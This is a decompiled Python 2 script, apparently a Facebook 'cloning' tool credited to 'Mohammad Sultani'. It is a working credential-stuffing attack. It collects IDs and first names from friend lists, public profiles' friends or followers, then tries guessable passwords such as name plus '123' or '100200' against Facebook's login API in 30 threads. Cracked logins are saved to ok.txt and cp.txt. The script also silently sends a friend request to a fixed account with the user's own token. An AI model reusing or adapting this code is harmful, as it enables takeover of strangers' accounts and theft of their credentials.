# DECOMPILED BY HUNTERBOY ALAMIN
# FACEBOOK : MD ALAMIN KHAN
# FUCK SULTANI 

try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("pkg install nodejs")
    os.system("pip2 install npm")
try:
    os.mkdir('.save')
except OSError:
    pass
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def logging():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[] Logging In\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def saving():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[] Saving Token\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def updateing():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[] Getting Updates\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def logout():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[] Logging Out\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)
def download():
    titik = [".   ","..  ","... "]
    for o in titik:
        print("\r\033[1;32m[] Downloading\033[0;97m "+o),;sys.stdout.flush();time.sleep(1)

#logo
logo= '''
╔══╗───█──────────█▀────╔══╗
║─╔╬═╗─█▄─────────█▀──╔═╬╗─║
╚═╬╝╔╬═╗──█▀█─█─█─▀▀╔═╬╗╚╬═╝
──╚═╬╝╔╬═╗█▄█─▀▄▀─╔═╬╗╚╬═╝──
────╚═╬╝╔╬═╗────╔═╬╗╚╬═╝────
──────╚═╬╝╔╬═╗╔═╬╗╚╬═╝──────
────────╚═╬╝╔╬╬╗╚╬═╝────────
──────────╚═╬╝╚╬═╝──────────
────────────╚══╝────────────


$$$$$$$$\       $$$$$$$\  
$$  _____|      $$  __$$\ 
$$ |            $$ |  $$ |
$$$$$\          $$$$$$$\ |
$$  __|         $$  __$$\ 
$$ |            $$ |  $$ |
$$ |            $$$$$$$  |
\__|            \_______/ 
                          

\033[1;97m--------------------------------------------------
\033[1;97m➣ Author   : MOHAMMAD SULTANI
\033[1;97m➣ GitHub   : https://github.com/Mohammadjan1122
\033[1;97m➣ Telegram  : https://t.me/sultani1122
\033[1;97m--------------------------------------------------
                     '''
idh = []

def Mohammad():
    os.system("clear")
    print(logo)
    print("\t\t\033[1;32mChecking For Update\033[0;97m")
    os.system("git pull origin master")
    time.sleep(1)
    login_check()
def login_check():
        os.system("clear")
        print(logo)
        print("\t\t\033[1;32mChecking User Login\033[0;97m")
        try:
                open(".tool.txt","r")
                time.sleep(1)
                login_choice()
        except(KeyError , IOError):
                time.sleep(1)
                tool_login()
def tool_login():
    os.system("clear")
    print logo
    username = raw_input("\033[1;97m[+]\033[1;97m Username :\033[1;93m ")
    if username =="Mohammad":
        os.system("clear")
        print logo
        print ("\033[1;92m[] Username : Mohammad (Correct)")
        passwordss = raw_input("\033[1;97m[+] \033[1;97mPassword :\033[1;93m ")
        if passwordss =="Sultani":
            os.system("clear")
            print logo
            print ("\033[1;92m[] Username : Mohammad (Correct)")
            print ("\033[1;92m[] Password : Sultani (Correct)")
            print("\033[1;97m--------------------------------------------------")
            time.sleep(1)
            print("Login Successful\033[0;97m")
            time.sleep(1)
            sav = open(".tool.txt","w")
            sav.write(username + "|" +passwordss)
            sav.close()
        try:
            open(".facebook_token.txt","r")
            menu()
        except(KeyError , IOError):
            login_choice()
        else:
            print("")
            print ("\033[1;31mPassword : "+passwordss+" (Wrong)\033[0;97m")
            print("")
            time.sleep(1)
            tool_login()
    else:
        print("")
        print ("\033[1;31mUsername : "+username+" (Wrong)\033[0;97m")
        print("")
        time.sleep(1)
        tool_login()

def login_choice():
        os.system("clear")
        try:
                open(".facebook_token.txt","r")
                menu()
        except IOError:
                os.system("clear")
                print(logo)
                print("\033[1;97m[1]\033[1;91m--\033[1;97mLogin With Access Token")
                print("\033[1;97m[2]\033[1;91m--\033[1;97mLogin With Username/Password ")
                print("\033[1;97m[0]\033[1;91m--\033[1;97mExit")
                print("\033[1;97m--------------------------------------------------")
                login_select()
def login_select():
    select = raw_input("\n ")
    if select =="1":
        login_token()
    elif select =="2":
        login()
    else:
        print("\t\t\033[1;32mChoose Valid Option \033[0;97m")
        login_select()
def login():
        os.system("clear")
        print(logo)
        print("\t\t\033[1;32mLogin Facebook\033[0;97m")
        print("\033[1;97m--------------------------------------------------")
        print("\t\t\033[1;97m[!] Please Wait")
        print("\033[1;97m--------------------------------------------------")
        time.sleep(5)
        os.system("clear")
        print(logo)
        print("\t\t\033[1;32mLogin with fb\033[0;97m")
        print("\033[1;97m--------------------------------------------------")
        id = raw_input("\033[1;97m[+]\033[1;97m ID/Mail/Num :\033[1;93m ")
        id1=id.replace(' ','')
        id2=id1.replace('(','')
        uid=id2.replace(')','')
        pwd = raw_input("\033[1;97m[+]\033[1;97m Password   :\033[1;93m ")
        print("\033[1;97m--------------------------------------------------")
        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
        q = json.loads(data)
        if "access_token" in q:
            succ = open(".facebook_token.txt","w")
            succ.write(q["loc"])
            succ.close()
            requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
            time.sleep(1)
            print("\t\t\033[1;32mLogged In Successfully\033[0;97m")
            time.sleep(1)
            menu()
        else:
            if "www.facebook.com" in q["error_msg"]:
                print ("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
                time.sleep(1)
                login()
            else:
                print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
                time.sleep(1)
                login()

def login_token():
        os.system("clear")
        try:
                open(".facebook_token.txt","r")
                time.sleep(1)
                menu()
        except (KeyError , IOError):
            os.system("clear")
            print(logo)
            print("\t\t\033[1;32mLogin Using Token\033[0;97m")
            print("\033[1;97m--------------------------------------------------")
            token = raw_input("\033[1;97m[+] Token :\033[1;97m ")
            print("\033[1;97m--------------------------------------------------")
            time.sleep(1)
            print("Please Wait")
            try:
                r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
                a = json.loads(r.text)
                name = a["name"]
            except KeyError:
                os.system("clear")
                print logo
                print("\033[1;31mInvalid Token\033[0;97m")
                raw_input("Press Enter To Try Again ")
                login_token()
            token_save = open(".facebook_token.txt","w")
            token_save.write(token)
            token_save.close()
            time.sleep(1)
            print("\t\t\033[1;32mToken Saved Successfully\033[0;97m")
            os.system("clear")
            print logo
            print("\t\t\033[1;97mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;92mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;97mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;92mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;97mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;92mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;97mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;92mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;97mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;92mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;97mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;92mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;97mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;92mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;92mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            os.system("clear")
            print logo
            print("\t\t\033[1;92mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;97mloading 0_0\033[1;0m")
            time.sleep(0.05)
            os.system("clear")
            print logo
            print("\t\t\033[1;97mPlease Wait 0_0\033[1;0m")
            time.sleep(5)
            os.system("clear")
            print logo
            print("\t\t\033[1;93mYour Token Has Been Saved\033[1;0m")
            time.sleep(1)
            os.system('xdg-open https://m.facebook.com/Mohammad.hacker.1122')
            menu()

def menu():
        os.system("clear")
        print(logo)
        print("\t\t\033[1;32mChecking Logged In ID\033[0;97m")
        try:
                token = open(".facebook_token.txt","r").read()
        except IOError:
                os.system("clear")
                print(logo)
                print("\t\t\033[1;31mLogin Facebook ID\033[0;97m")
                time.sleep(1)
                login_choice()
        try:
                r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
                a = json.loads(r.text)
                name = a["name"]
        except KeyError:
                os.system("clear")
                print(logo)
                print("\t\t\033[1;31mLogged In ID Expired\033[0;97m")
                time.sleep(1)
                os.system("rm -rf .facebook_token.txt")
                login_choice()
        os.system("clear")
        print(logo)
        print("\t\t\033[1;32mLogin Approved\033[0;97m")
        time.sleep(2)
        os.system("clear")
        print(logo)
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\033[1;32mLogged In User : "+name+"\033[0;97m").center(50)
        print("\033[1;97m--------------------------------------------------")
        print("\033[1;93minfect \033[1;97m(\033[1;92mSimple Command\033[1;97m) ").center(50)
        print("\033[1;97m--------------------------------------------------")
        print("\033[1;97m[1]\033[1;91m--\033[1;97miRanian Fb Cloning Menu")
        print("\033[1;97m[3]\033[1;91m--\033[1;97mContact")
        print("\033[1;97m--------------------------------------------------")
        menu_option()

def menu_option():
    option = raw_input("\n ")
    if option =="1":
        crack()
    elif option =="3":
        os.system("xdg-open https://t.me/DARK_SECURITE")
    else:
        print("\033[1;31mSelect Valid Option")
        menu_option()

def crack():
        global token
        os.system("clear")
        try:
                token = open(".facebook_token.txt","r").read()
        except IOError:
                print("")
                print("\t\t\033[1;31mLogin Facebook ID\033[0;97m")
                print("")
                time.sleep(1)
                login_choice()
        os.system("clear")
        print(logo)
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;92mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\t\t\033[1;97mloading 0_0\033[1;0m")
        time.sleep(0.05)
        os.system("clear")
        print logo
        print("\033[1;97m[1]\033[1;91m--\033[1;97mClone From Friendlist\033[1;0m")
        print("\033[1;97m[2]\033[1;91m--\033[1;97mClone From Public ID\033[1;0m")
        print("\033[1;97m[3]\033[1;91m--\033[1;97mClone From Followers\033[1;0m")
        print("\033[1;97m[0]\033[1;91m--\033[1;97mBack\033[1;0m")
        print("\033[1;97m--------------------------------------------------")
        crack_select()

def crack_select():
        select = raw_input("")
        id=[]
        oks=[]
        cps=[]
        if select=="1":
                os.system("clear")
                print logo
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        if select =="2":
                os.system("clear")
                print(logo)
                print("\t\t\033[1;97mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;92mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;97mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;92mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;97mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;92mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;97mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;92mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;97mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;92mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;97mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;92mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;97mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;92mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;92mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;92mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;97mloading 0_0\033[1;0m")
                time.sleep(0.05)
                os.system("clear")
                print logo
                print("\t\t\033[1;32mCloning From Public ID\033[0;97m")
                print("\033[1;97m--------------------------------------------------")
                idt = raw_input("\033[1;97m[+] ID/Username :\033[1;93m ")
                print("\033[1;97m--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[] Cloning From : "+q["name"])
                except KeyError:
                    print("")
                    print("\t\t\033[1;31mCannot Clone From This User\033[0;97m")
                    print("")
                    raw_input("Press Enter To Back ")
                    crack()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid = i["id"]
                        na = i["name"]
                        nm = na.rsplit(" ")[0]
                        id.append(uid+"|"+nm)
        elif select =="3":
                os.system("clear")
                print logo
                print("\t\t\033[1;32mCloning From Followers\033[0;97m")
                print("\033[1;97m--------------------------------------------------")
                idt = raw_input("\033[1;97m[+] ID/Username :\033[1;93m ")
                print("\033[1;97m--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[] Cloning From : "+q["name"])
                except KeyError:
                    print("")
                    print("\t\t\033[1;31mCannot Found Followers\033[0;97m")
                    print("")
                    raw_input("Press Enter To Back ")
                    crack()
                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid = i["id"]
                        na = i["name"]
                        nm = na.rsplit(" ")[0]
                        id.append(uid+"|"+nm)
        elif select =="0":
            menu()
        else:
                print("\t\t\033[1;31mSelect Valid Option\033[0;97m")
                crack_select()
        print("\033[1;97m[+] Total IDs :\033[1;93m "+str(len(id)))
        time.sleep(0.05)
        print("\033[1;97m[+] Plz Wait Clone Account Will Be Appear Here\033[1;0m")
        time.sleep(0.05)
        print("\033[1;97m--------------------------------------------------\033[1;0m")

        def main(arg):
                user=arg
                uid,name=user.split("|")
                try:
                    pass1=name+"123"
                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                    d=json.loads(q)
                    if "access_token" in d:
                       print("\033[1;94m[\033[1;92mOK\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass1+"\033[1;91m--\033[1;97m"+name)
                       ok=open("ok.txt","a")
                       ok.write(uid+" | "+pass1+"\n")
                       ok.close()
                       oks.append(uid)
                    else:
                        if 'www.facebook.com' in d['error_msg']:
                            print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass1+"\033[1;91m--\033[1;97m"+name)
                            cp=open("cp.txt","a")
                            cp.write(uid+" | "+pass1+"\n")
                            cp.close()
                            cps.append(uid)
                        else:
                            pass2=name+"1234"
                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                            d=json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass2+"\033[1;91m--\033[1;97m"+name)
                                cp=open("cp.txt","a")
                                cp.write(uid+" | "+pass2+"\n")
                                cp.close()
                                cps.append(uid)
                            else:
                                if 'access_token' in d:
                                    print("\033[1;94m[\033[1;92mOK\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass2+"\033[1;91m--\033[1;97m"+name)
                                    ok=open("ok.txt","a")
                                    ok.write(uid+" | "+pass2+"\n")
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass3=name+"12345"
                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                    d=json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass3+"\033[1;91m--\033[1;97m"+name)
                                        cp=open("cp.txt","a")
                                        cp.write(uid+" | "+pass3+"\n")
                                        cp.close()
                                        cps.append(uid)
                                    else:
                                        if 'access_token' in d:
                                            print("\033[1;94m[\033[1;92mOK\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass3+"\033[1;91m--\033[1;97m"+name)
                                            ok=open("ok.txt","a")
                                            ok.write(uid+" | "+pass3+"\n")
                                            ok.close()
                                            oks.append(uid)
                                        else:
                                            pass4="100200"
                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                            d=json.loads(q)
                                            if 'www.facebook.com' in d['error_msg']:
                                                print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass4+"\033[1;91m--\033[1;97m"+name)
                                                cp=open("cp.txt","a")
                                                cp.write(uid+" | "+pass4+"\n")
                                                cp.close()
                                                cps.append(uid)
                                            else:
                                                if 'access_token' in d:
                                                    print("\033[1;94m[\033[1;92mOK\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass4+"\033[1;91m--\033[1;97m"+name)
                                                    ok=open("ok.txt","a")
                                                    ok.write(uid+" | "+pass4+"\n")
                                                    ok.close()
                                                    oks.append(uid)
                                                else:
                                                    pass5="100200300"
                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                                    d=json.loads(q)
                                                    if 'www.facebook.com' in d['error_msg']:
                                                        print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass5+"\033[1;91m--\033[1;97m"+name)
                                                        cp=open("cp.txt","a")
                                                        cp.write(uid+" | "+pass5+"\n")
                                                        cp.close()
                                                        cps.append(uid)
                                                    else:
                                                        if 'access_token' in d:
                                                            print("\033[1;94m[\033[1;92mOK\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass5+"\033[1;91m--\033[1;97m"+name)
                                                            ok=open("ok.txt","a")
                                                            ok.write(uid+" | "+pass5+"\n")
                                                            ok.close()
                                                            oks.append(uid)
                                                        else:
                                                            pass6=name+"123456"
                                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                                            d=json.loads(q)
                                                            if 'www.facebook.com' in d['error_msg']:
                                                                 print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass6+"\033[1;91m--\033[1;97m"+name)
                                                                 cp=open("cp.txt","a")
                                                                 cp.write(uid+" | "+pass6+"\n")
                                                                 cp.close()
                                                                 cps.append(uid)
                                                            else:
                                                                if 'access_token' in d:
                                                                    print("\033[1;94m[\033[1;92mOK\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass6+"\033[1;91m--\033[1;97m"+name)
                                                                    ok=open("ok.txt","a")
                                                                    ok.write(uid+" | "+pass6+"\n")
                                                                    ok.close()
                                                                    oks.append(uid)
                                                                else:
                                                                    pass7=name+"100200"
                                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                                                    d=json.loads(q)
                                                                    if 'www.facebook.com' in d['error_msg']:
                                                                        print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass7+"\033[1;91m--\033[1;97m"+name)
                                                                        cp=open("cp.txt","a")
                                                                        cp.write(uid+" | "+pass7+"\n")
                                                                        cp.close()
                                                                        cps.append(uid)
                                                                    else:
                                                                        if 'access_token' in d:
                                                                            print("\033[1;94m[\033[1;92mOK\033[1;94m]\033[1;97m "+uid+"\033[1;91m--\033[1;97m"+pass7+"\033[1;91m--\033[1;97m"+name)
                                                                            ok=open("ok.txt","a")
                                                                            ok.write(uid+" | "+pass7+"\n")
                                                                            ok.close()
                                                                            oks.append(uid)

                except:
                        pass

        p = ThreadPool(30)
        p.map(main,id)
        print("\033[1;97m--------------------------------------------------\033[1;0m")
        print("\033[1;97mThe Process Has Been Completed")
        print("\033[1;97mTotal \033[1;92mOk\033[1;91m/\033[1;93mCp :"+str(len(oks)))+"/"+str(len(cps))
        print("\033[1;97m--------------------------------------------------\033[1;0m")
        raw_input("Press Enter To Back ")
        menu()

if __name__ == '__main__':
    Mohammad()
